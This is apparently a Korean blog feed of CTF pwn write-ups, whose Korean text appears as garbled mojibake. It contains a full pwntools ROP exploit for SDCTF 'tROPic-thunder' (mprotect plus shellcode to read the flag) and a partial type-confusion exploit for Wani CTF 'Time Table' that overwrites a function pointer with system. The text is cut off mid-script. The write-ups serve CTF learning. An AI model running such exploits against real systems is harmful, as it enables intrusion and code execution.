href="#tROPic-thunder" class="headerlink" title="tROPic-thunder"></a>tROPic-thunder</h2><blockquote><p>I hope this isnâ€™t your first rodeo<br>Connect via:Â <code>nc thunder.sdc.tf 1337</code><br>DockerfileÂ tROPic-thunder</p></blockquote><ul><li>[69 solves &#x2F; 250 points]</li></ul><h3 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x03 0xffffffff  if (A != 0xffffffff) goto 0008</span><br><span class="line"> 0005: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0008</span><br><span class="line"> 0006: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>seccompì´ ê±¸ë ¤ìžˆì§€ë§Œ í‰ì´í•˜ê²Œ ê±¸ë ¤ìžˆë‹¤. <code>execve</code>ë¥¼ ì‹¤í–‰ì‹œí‚¤ìž.</p><p><code>mprotect</code>ê°€ ìžˆëŠ” í•œ, ì´ê²ƒì„ ì‹¤í–‰ì‹œì¼œ íŠ¹ì • ê³µê°„ì— ì‹¤í–‰ ê¶Œí•œì„ ì£¼ê³  ê±°ê¸°ì— ì‰˜ ì½”ë“œë¥¼ ë„£ì–´ì„œ ê·¸ ê³³ìœ¼ë¡œ ì í”„í•˜ëŠ” ìƒê°ì„ í•˜ìž.</p><h3 id="Exploit-Code-2"><a href="#Exploit-Code-2" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./tROPic-thunder&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;thunder.sdc.tf&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./tROPic-thunder&#x27;</span>)</span><br><span class="line"></span><br><span class="line">syscall = <span class="number">0x41003c</span></span><br><span class="line">pop_rax = <span class="number">0x4005af</span></span><br><span class="line">pop_rdi = <span class="number">0x4006a6</span></span><br><span class="line">pop_rsi = <span class="number">0x40165c</span></span><br><span class="line">pop_rdx = <span class="number">0x4589f5</span></span><br><span class="line"></span><br><span class="line">bss = e.bss() + <span class="number">0xc0</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x70</span> + <span class="number">0x8</span>)</span><br><span class="line"><span class="comment"># mprotect(bss, 0x1000, 7)</span></span><br><span class="line"><span class="comment"># payload += p64(pop_rax)</span></span><br><span class="line"><span class="comment"># payload += p64(10)</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">0x000000006d9000</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(<span class="number">0x4000</span>)</span><br><span class="line">payload += p64(pop_rdx)</span><br><span class="line">payload += p64(<span class="number">7</span>)</span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;mprotect&#x27;</span>])</span><br><span class="line"><span class="comment"># payload += p64(syscall)</span></span><br><span class="line"><span class="comment"># read(0, bss, 0x1000)</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(<span class="number">0x000000006d9000</span>)</span><br><span class="line">payload += p64(pop_rdx)</span><br><span class="line">payload += p64(<span class="number">0x4000</span>)</span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line"><span class="comment"># payload += p64(syscall)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload += p64(0x41414141) # jmp!</span></span><br><span class="line">payload += p64(<span class="number">0x000000006d9000</span>) <span class="comment"># jmp!</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;!\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># open, read, write</span></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += asm(shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag.txt&#x27;</span>))</span><br><span class="line">payload += asm(shellcraft.read(<span class="number">3</span>, <span class="string">&#x27;rsp&#x27;</span>, <span class="number">0x100</span>))</span><br><span class="line">payload += asm(shellcraft.write(<span class="number">1</span>, <span class="string">&#x27;rsp&#x27;</span>, <span class="number">0x100</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = asm(payload)</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># sdctf&#123;I_w4tch3d_tR0p1c_7huNd3r_wh1l3_m4k1nG_7h1s_ch4al13ng3&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> San Diego </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fsb </tag>
            
            <tag> seccomp </tag>
            
            <tag> shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Wani CTF 2023 - Time Table (type confusion)</title>
      <link href="/230509-wanictf2023-8.time-table/"/>
      <url>/230509-wanictf2023-8.time-table/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1988">https://ctftime.org/event/1988</a></li></ul><blockquote><p>Is your timetable alright?<br><code>nc timetable-pwn.wanictf.org 9008</code><br>Writer : EBeb</p></blockquote><ul><li>[33 solves &#x2F; 294 points]</li></ul><p>ì²˜ìŒ í’€ì–´ë³´ëŠ” Type Confusion ìœ í˜•.<br>ë‚´ê°€ ì•„ëŠ” Type Confusionì€ UAFì™€ ê²°í•©ë˜ì–´ ìžˆì—ˆëŠ”ë° ì´ê±´ ì•„ë‹ˆì—ˆë‹¤. í’€ì–´ë³´ë‹ˆ ìƒê°ë³´ë‹¤ í’€ë§Œí•´ì„œ ë†€ëžë‹¤.<br>ë‹¤ í’€ê³  ë‚˜ì„œ ë¡¸ì—…ì„ ì„¸ ê°œ ë´¤ëŠ”ë° ë˜‘ê°™ì€ ì·¨ì•½ì ì„ ì´ìš©í–ˆìœ¼ë‚˜ ìµìŠ¤ë°©ë²•ì´ ë‚˜ì™€ ì¡°ê¸ˆì”© ë‹¬ëžë‹¤. </p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>ì†ŒìŠ¤ì½”ë“œê°€ ë‹¤ ì£¼ì–´ì ¸ìžˆì–´ì„œ ì°¨ê·¼ì°¨ê·¼ ì½ì–´ë³´ë©´ ëœë‹¤. ì¼ë‹¨ ë¬¸ì œ ë°”ì´ë„ˆë¦¬ë¥¼ ì‹¤í–‰í•´ë³´ë©´ ì•„ëž˜ì™€ ê°™ë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">WELCOME TO THE TIME TABLE PROGRAM</span><br><span class="line">Enter your name : aaaa</span><br><span class="line">Enter your student id : 1</span><br><span class="line">Enter your major : 1</span><br><span class="line"></span><br><span class="line">        MON             TUE             WED             THU             FRI</span><br><span class="line">1       (null)          (null)          (null)          (null)          (null)          </span><br><span class="line">2       (null)          (null)          (null)          (null)          (null)          </span><br><span class="line">3       (null)          (null)          (null)          (null)          (null)          </span><br><span class="line">4       (null)          (null)          (null)          (null)          (null)          </span><br><span class="line">5       (null)          (null)          (null)          (null)          (null)          </span><br><span class="line"></span><br><span class="line">1. Register Mandatory Class</span><br><span class="line">2. Register Elective Class</span><br><span class="line">3. See Class Detail</span><br><span class="line">4. Write Memo</span><br><span class="line">5. Exit</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p>ì²˜ìŒì— name, id, majorë¥¼ ìž…ë ¥í•˜ê³  ì‹œê°„í‘œë¡œ ë³´ì´ëŠ” ê²ƒì„ ì¶œë ¥í•œ í›„, exitì„ ì œì™¸í•˜ê³  4ê°€ì§€ì˜ ê¸°ëŠ¥ì„ ì‹¤í–‰í•  ìˆ˜ ìžˆë„ë¡ ë˜ì–´ìžˆë‹¤. ë¨¼ì € registerì™€ ê´€ë ¨ëœ ê¸°ëŠ¥ì„ ì‚´íŽ´ë´¤ì„ ë•Œ <code>mandatory_subject</code>ì™€ <code>elective_subject</code> êµ¬ì¡°ì²´ê°€ ë³´ì˜€ë‹¤. ê·¸ë¦¬ê³  4ë²ˆ ë©”ë‰´ê°€ ìˆ˜ìƒí•´ ë³´ì—¬ì„œ í•´ë‹¹ í•¨ìˆ˜ë„ í•¨ê»˜ ë´¤ë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">register_mandatory_class</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  mandatory_subject choice;</span><br><span class="line">  print_table(timetable);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;-----Mandatory Class List-----\n&quot;</span>);</span><br><span class="line">  print_mandatory_list();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;i); <span class="comment">// ìŒìˆ˜ ê°€ëŠ¥</span></span><br><span class="line">  choice = mandatory_list[i]; <span class="comment">// oob ?</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, choice.time[<span class="number">0</span>]);</span><br><span class="line">  timetable[choice.time[<span class="number">0</span>]][choice.time[<span class="number">1</span>]].name = choice.name;</span><br><span class="line">  timetable[choice.time[<span class="number">0</span>]][choice.time[<span class="number">1</span>]].type = MANDATORY_CLASS_CODE;</span><br><span class="line">  timetable[choice.time[<span class="number">0</span>]][choice.time[<span class="number">1</span>]].detail = &amp;mandatory_list[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">register_elective_class</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  elective_subject choice;</span><br><span class="line">  print_table(timetable);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;-----Elective Class List-----\n&quot;</span>);</span><br><span class="line">  print_elective_list();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;i);</span><br><span class="line">  choice = elective_list[i];</span><br><span class="line">  <span class="keyword">if</span> (choice.IsAvailable(&amp;user) == <span class="number">1</span>) &#123;</span><br><span class="line">    timetable[choice.time[<span class="number">0</span>]][choice.time[<span class="number">1</span>]].name = choice.name;</span><br><span class="line">    <span class="comment">// The type of timetable is 0 by default since it is a global value.</span></span><br><span class="line">    timetable[choice.time[<span class="number">0</span>]][choice.time[<span class="number">1</span>]].detail = &amp;elective_list[i];</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You can&#x27;t register this class\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>register_elective_class</code> í•¨ìˆ˜ì—ì„œ <code>choice.IsAvailable(&amp;user)</code>ë¥¼ ì‹¤í–‰í•˜ëŠ” ë¶€ë¶„ì´ ìžˆë‹¤. <code>user</code>ëŠ” í”„ë¡œê·¸ëž¨ ë§¨ ì²˜ìŒ ë‚˜ì˜ ìž…ë ¥ê°’ì´ë‹¤. <code>elective_subject</code> êµ¬ì¡°ì²´ ì•ˆì— í•¨ìˆ˜í¬ì¸í„°ê°€ ìžˆìŒì„ í™•ì¸í–ˆë‹¤. (ë§Œì•½ ì´ í•¨ìˆ˜í¬ì¸í„°ë¥¼ ë®ì„ ìˆ˜ ìžˆë‹¤ë©´, <code>system</code> í•¨ìˆ˜ë¡œ ë®ê³ , ì¸ìžë¡œ ë“¤ì–´ê°„ ë‚˜ì˜ ìž…ë ¥ê°’ <code>user</code>ëŠ” <code>/bin/sh</code>ë¥¼ ë„£ì–´ì•¼ê² ë‹¤.)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">write_memo</span><span class="params">()</span> &#123;</span><br><span class="line">  comma *choice = choose_time(timetable);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;WRITE MEMO FOR THE CLASS\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (choice-&gt;type == MANDATORY_CLASS_CODE) &#123;</span><br><span class="line">    read(<span class="number">0</span>, ((mandatory_subject *)choice-&gt;detail)-&gt;memo, <span class="number">30</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (choice-&gt;type == ELECTIVE_CLASS_CODE) &#123;</span><br><span class="line">    read(<span class="number">0</span>, ((elective_subject *)choice-&gt;detail)-&gt;memo, <span class="number">30</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>choice-&gt;type</code>ì„ ê¸°ì¤€ìœ¼ë¡œ <code>memo</code>ì— 30ê¸€ìž ìž…ë ¥í•œë‹¤. ì—¬ê¸°ì„œ ë§Œì•½ Type confusionì´ ë°œìƒí•œë‹¤ë©´ ë³¸ëž˜ëŠ” <code>mandatory_subject</code>ì¸ë° <code>elective_subject</code>ìœ¼ë¡œ ì°©ê°í•´ì„œ <code>elective_subject</code> êµ¬ì¡°ì²´ì— ìž…ë ¥ì„ í•˜ê²Œ ë  ê²ƒì´ë‹¤. êµ¬ì¡°ì²´ offsetì„ ì‚´íŽ´ë³´ê³  ìœ ì˜ë¯¸í•œ ìœ„ì¹˜ì— ì“°ê¸°ë¥¼ í•  ìˆ˜ ìžˆëŠ”ì§€ ìƒê°í•´ë³´ìž.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="type">char</span> *name; <span class="comment">// 0~8</span></span><br><span class="line">  <span class="type">int</span> time[<span class="number">2</span>]; <span class="comment">// 8~16</span></span><br><span class="line">  <span class="type">char</span> *target[<span class="number">4</span>]; <span class="comment">// 16~48</span></span><br><span class="line">  <span class="type">char</span> memo[<span class="number">32</span>]; <span class="comment">// 48~80</span></span><br><span class="line">  <span class="type">char</span> *professor; <span class="comment">// 80~88</span></span><br><span class="line">&#125; mandatory_subject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="type">char</span> *name; <span class="comment">// 0~8</span></span><br><span class="line">  <span class="type">int</span> time[<span class="number">2</span>]; <span class="comment">// 8~16</span></span><br><span class="line">  <span class="type">char</span> memo[<span class="number">32</span>]; <span class="comment">// 16~48</span></span><br><span class="line">  <span class="type">char</span> *professor; <span class="comment">// 48~56</span></span><br><span class="line">  <span class="type">int</span> (*IsAvailable)(student *); <span class="comment">// 56~64</span></span><br><span class="line">&#125; elective_subject;</span><br></pre></td></tr></table></figure><p>ì£¼ì„ìœ¼ë¡œ offsetì„ ì ì–´ë†¨ë‹¤. <code>mandatory_subject</code> êµ¬ì¡°ì²´ì˜ <code>memo</code>ëŠ” 48ë²ˆì§¸ì— ìœ„ì¹˜í•œë‹¤. <code>elective_subject</code> êµ¬ì¡°ì²´ì˜ 48ë²ˆì§¸ëŠ” <code>*proffesor</code>ì´ë‹¤. <code>write_memo</code> í•¨ìˆ˜ì—ì„œ 30ë°”ì´íŠ¸ë¥¼ ì“¸ ìˆ˜ ìžˆì—ˆìœ¼ë‹ˆ ë’¤ì˜ í•¨ìˆ˜í¬ì¸í„°ë¥¼ ë®ì„ ìˆ˜ ìžˆë‹¤.</p><p><code>elective_subject</code> êµ¬ì¡°ì²´ë¥¼ <code>mandatory_subject</code> êµ¬ì¡°ì²´ë¡œ í—·ê°ˆë¦¬ê³  <code>memo</code>ë¥¼ ìž‘ì„±í•˜ê²Œ ëœë‹¤ë©´ <code>elective_subject</code> êµ¬ì¡°ì²´ì˜ í•¨ìˆ˜ í¬ì¸í„°ë¥¼ ë®ì–´ <code>register_elective_class</code> í•¨ìˆ˜ì—ì„œ í•¨ìˆ˜ í¬ì¸í„°ë¥¼ ì‹¤í–‰ì‹œì¼œ íë¦„ì„ ë³€ê²½í•  ìˆ˜ ìžˆì„ ê²ƒì´ë‹¤.</p><p>ê·¸ ì „ì— libc leakì„ í•´ì•¼í•˜ëŠ”ë° leakë„ Type confusionì„ ì´ìš©í•´ì„œ í•  ìˆ˜ ìžˆë‹¤. ë°˜ëŒ€ë¡œ Type confusionì„ ì¼ìœ¼í‚¤ë©´ ëœë‹¤. êµ¬ì¡°ë¥¼ printí•˜ëŠ” ê¸°ëŠ¥ì´ ìžˆì–´ì„œ leakì´ ê°€ëŠ¥í•˜ë‹¤.</p><p><code>mandatory_subject</code> êµ¬ì¡°ì²´ë¥¼ <code>elective_subject</code> êµ¬ì¡°ì²´ë¡œ í—·ê°ˆë¦¬ê³  <code>memo</code>ë¥¼ ìž‘ì„±í•˜ê²Œ ëœë‹¤ë©´ <code>mandatory_subject</code> êµ¬ì¡°ì²´ì—ì„œ <code>*target[4]</code>ì„ ë®ê²Œ ëœë‹¤. ì—¬ê¸°ì— <code>GOTê°€ ì €ìž¥ëœ ì£¼ì†Œ</code>ë¥¼ ì ê³  êµ¬ì¡°ë¥¼ printí•´ì£¼ëŠ” <code>print_mandatory_subject</code> í•¨ìˆ˜ì—ì„œ <code>GOT</code>ê°€ ì¶œë ¥ë  ê²ƒì´ë‹¤.</p><p>í•˜ì§€ë§Œ ë‚œ ì´ ë°©ë²•ì€ ì‚¬ìš©í•˜ì§€ ì•Šê³  í•¨ìˆ˜ í¬ì¸í„°ë¥¼ ë®ëŠ” ê³¼ì •ì—ì„œ <code>_IO_2_1_stdout_</code>ì „ê¹Œì§€ ìž…ë ¥ê°’ì„ ì£¼ì–´ <code>print_elective_subject</code> í•¨ìˆ˜ì—ì„œ <code>memo</code>ë¥¼ ì¶œë ¥í•  ë•Œ <code>GOT</code>ê°€ ê°™ì´ ì¶œë ¥ë˜ë„ë¡ í–ˆê¸° ë•Œë¬¸ì— ë³´ë‹¤ íŽ¸í•˜ê²Œ <code>libc address</code>ë¥¼ êµ¬í•  ìˆ˜ ìžˆì—ˆë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x405250 &lt;elective_list+112&gt;:   0x6161616161616161      0x6262626262626262</span><br><span class="line">0x405260 &lt;stdout@GLIBC_2.2.5&gt;:  0x00007faa16da05a0      0x0000000000000000</span><br></pre></td></tr></table></figure><p>ë§ˆì§€ë§‰ìœ¼ë¡œ ì‚¬ì‹¤ <code>register_elective_class</code> í•¨ìˆ˜ë¥¼ ì‹¤í–‰ì‹œí‚¤ê¸° ìœ„í•´ì„œëŠ” ì¡°ê±´ì´ í•˜ë‚˜ í•„ìš”í•˜ë‹¤. ë°”ë¡œ ë§¨ ì²˜ìŒì— ìž…ë ¥í•˜ëŠ” <code>name</code>, <code>id</code>, <code>major</code>ì—ì„œ <code>id</code>ì™€ <code>major</code>ê°€ íŠ¹ì • ê°’ ì´ìƒì´ê±°ë‚˜ ì´í•˜ì—¬ì•¼ í•œë‹¤ëŠ” ì¡°ê±´ì´ ìžˆë‹¤. ì´ ì¡°ê±´ì„ ê°€ìž¥ ë¨¼ì € ë§žì¶°ì£¼ì–´ì•¼ í•œë‹¤.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><ol><li><code>name</code>ì—ëŠ” <code>/bin/sh</code>, <code>id</code>ì—ëŠ” <code>2000</code>, <code>major</code>ì—ëŠ” <code>100</code>ì„ ìž…ë ¥</li><li><code>libc leak</code> : <code>write_memo</code>ë¥¼ ì´ìš©í•˜ì—¬ <code>stdout</code> ì „ê¹Œì§€ ìž…ë ¥ í›„, <code>print_elective_subject</code> í•¨ìˆ˜ì—ì„œ êµ¬ì¡° ì¶œë ¥í•˜ì—¬ <code>_IO_2_1_stdout_</code> êµ¬í•¨</li><li>í•¨ìˆ˜ í¬ì¸í„° ë®ê¸° : <code>write_memo</code>ë¥¼ ì´ìš©í•˜ì—¬ í•¨ìˆ˜ í¬ì¸í„° offset ìžë¦¬ì— <code>system</code> í•¨ìˆ˜ ì£¼ì†Œ ë„£ê¸°</li><li>í•¨ìˆ˜ í¬ì¸í„°ê°€ ì‹¤í–‰ë  ìˆ˜ ìžˆë„ë¡ <code>register_elective_class</code> ì‹¤í–‰</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;timetable-pwn.wanictf.org&#x27;</span>, <span class="number">9008</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">libc = e.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_memo</span>(<span class="params">memo</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;FRI 3&#x27;</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    p.sendafter(<span class="string">&#x27;WRITE MEMO FOR THE CLASS\n&#x27;</span>, memo)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">see_class</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;FRI 3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># elective_subjectë¥¼ mandatory_subjectë¡œ í—·ê°ˆë¦¬ê²Œ í•´ì„œ</span></span><br><span class="line"><span class="comment"># memo[32]ë¥¼ ì ì„ ë•Œ í•¨ìˆ˜ í¬ì¸í„°ë¥¼ ë„£ì–´ì„œ</span></span><br><span class="line"><span class="comment"># elective_subject.student í•¨ìˆ˜ í¬ì¸í„°ë¥¼ ìˆ˜ì •í•  ìˆ˜ ìžˆë„ë¡ í•˜ê¸°</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;name :&#x27;</span>, <span 